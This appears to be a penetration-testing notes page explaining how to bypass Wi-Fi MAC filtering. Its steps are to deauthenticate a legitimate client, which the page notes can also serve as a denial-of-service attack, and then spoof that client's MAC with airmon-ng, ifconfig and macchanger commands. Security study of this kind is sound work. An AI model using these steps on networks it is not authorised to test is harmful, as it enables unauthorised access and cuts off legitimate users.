---
description: >-
  MAC filtering restricts Wi-Fi access to specific MAC addresses, but it can be
  bypassed using MAC spoofing—changing your device’s MAC to an allowed one.
---

# MAC Filtering (Can't Connect)

Using the same MAC can cause collisions, as two devices with identical MACs can’t coexist on one network. Better approaches is to **Deauth the legitimate client** to free the MAC, or wait for it to disconnect. Works well in BYOD networks with frequent connections/disconnections.

MAC collisions can sometimes be exploited for **DoS attacks**. In dual-band or multi-AP setups, using a client’s MAC on a different AP or switching to **5 GHz** (if available) can avoid collisions, as most clients use 2.4 GHz.

{% code title="Stop monitor mode" %}
```shellscript
sudo airmon-ng stop wlan0mon
```
{% endcode %}

{% code title="Check current MAC" %}
```shellscript
sudo macchanger wlan0
```
{% endcode %}

{% code title="Disable interface" %}
```shellscript
sudo ifconfig wlan0 down
```
{% endcode %}

<pre class="language-shellscript" data-title="Change MAC Address"><code class="lang-shellscript"><a data-footnote-ref href="#user-content-fn-1">sudo</a> macchanger wlan0 -m 3E:48:72:B7:62:2A
</code></pre>

{% code title="Enable interface" %}
```shellscript
sudo ifconfig wlan0 up
```
{% endcode %}



[^1]: 
